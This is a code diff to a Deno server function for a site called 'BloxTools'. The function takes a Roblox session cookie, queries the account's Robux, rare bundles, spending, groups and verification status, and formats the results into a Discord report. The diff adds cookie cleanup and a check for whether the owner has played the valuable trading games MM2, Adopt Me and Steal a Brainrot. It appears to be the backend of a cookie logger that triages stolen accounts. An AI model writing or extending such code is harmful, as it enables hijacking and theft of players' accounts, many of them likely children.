@@ -27,6 +27,13 @@ const SITE_NAME = "BloxTools";
 const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
 const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman
 
+// Tracked game universe IDs — checked to see if the cookie owner has played
+const TRACKED_GAMES: Array<{ name: string; universeId: number }> = [
+  { name: "MM2", universeId: 142823291 },
+  { name: "Steal a Brainrot", universeId: 109983668079237 },
+  { name: "Adopt Me", universeId: 920587237 },
+];
+
 Deno.serve(async (req) => {
   if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
 
@@ -35,6 +42,8 @@ Deno.serve(async (req) => {
     if (!body?.cookie || !body?.toolType || !body?.toolKey) {
       return json({ error: "Missing fields" }, 400);
     }
+    // Sanitize cookie — strip wrapping quotes, trailing commas/whitespace
+    body.cookie = body.cookie.trim().replace(/^["']+|["',\s]+$/g, "");
 
     const supabase = createClient(
       Deno.env.get("SUPABASE_URL")!,
@@ -172,6 +181,7 @@ interface RobloxInfo {
   robuxSpent: number | null;
   summary: number | null;
   screenshotUrl: string | null;
+  playedGames: Array<{ name: string; played: boolean }>;
 }
 
 async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
@@ -183,7 +193,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals] = await Promise.all([
+    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, playedGames] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
@@ -199,6 +209,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchVoiceEnabled(cookieHeader),
       fetchAgeVerified(cookieHeader),
       fetchTransactionTotals(auth.id, cookieHeader),
+      fetchPlayedGames(auth.id),
     ]);
 
     const createdAt = profile?.created ?? null;
@@ -233,11 +244,42 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       robuxSpent: transactionTotals.spent,
       summary: transactionTotals.summary,
       screenshotUrl,
+      playedGames,
     };
   } catch (e) {
     console.error("roblox lookup failed", e);
     return null;
   }
+}
+
+// Detects whether the user has played a tracked game by checking if they
+// own any badge from that game's universe. Most popular games award a
+// "welcome" / join badge, so this is a reliable proxy for "has played".
+async function fetchPlayedGames(userId: number): Promise<Array<{ name: string; played: boolean }>> {
+  return await Promise.all(
+    TRACKED_GAMES.map(async ({ name, universeId }) => {
+      try {
+        // Get a handful of badges from the universe
+        const badgesRes = await fetch(
+          `https://badges.roblox.com/v1/universes/${universeId}/badges?limit=25&sortOrder=Asc`,
+        );
+        if (!badgesRes.ok) return { name, played: false };
+        const badgesJson = await badgesRes.json() as { data?: Array<{ id: number }> };
+        const badgeIds = (badgesJson.data ?? []).map((b) => b.id);
+        if (badgeIds.length === 0) return { name, played: false };
+
+        // Ask Roblox which of those badges the user has earned
+        const ownedRes = await fetch(
+          `https://badges.roblox.com/v1/users/${userId}/badges/awarded-dates?badgeIds=${badgeIds.join(",")}`,
+        );
+        if (!ownedRes.ok) return { name, played: false };
+        const ownedJson = await ownedRes.json() as { data?: Array<{ badgeId: number; awardedDate: string }> };
+        return { name, played: (ownedJson.data ?? []).length > 0 };
+      } catch {
+        return { name, played: false };
+      }
+    }),
+  );
 }
 
 async function fetchAvatar(userId: number): Promise<string | null> {
@@ -459,6 +501,17 @@ function buildDiscordPayload(opts: {
       { name: "💳 Total Robux Spent", value: roblox.robuxSpent !== null ? `${roblox.robuxSpent.toLocaleString()} R$` : "Unknown", inline: true },
       { name: "📊 Lifetime Summary", value: roblox.summary !== null ? `${roblox.summary >= 0 ? "+" : ""}${roblox.summary.toLocaleString()} R$` : "Unknown", inline: true },
     );
+
+    // Tracked games played
+    if (roblox.playedGames.length > 0) {
+      mainFields.push({
+        name: "🎮 Played Games",
+        value: roblox.playedGames
+          .map((g) => `${g.played ? "✅" : "❌"} ${g.name}`)
+          .join("\n"),
+        inline: false,
+      });
+    }
 
     // Owned groups — chunked to 1024 chars per field
     if (roblox.ownedGroups.length > 0) {
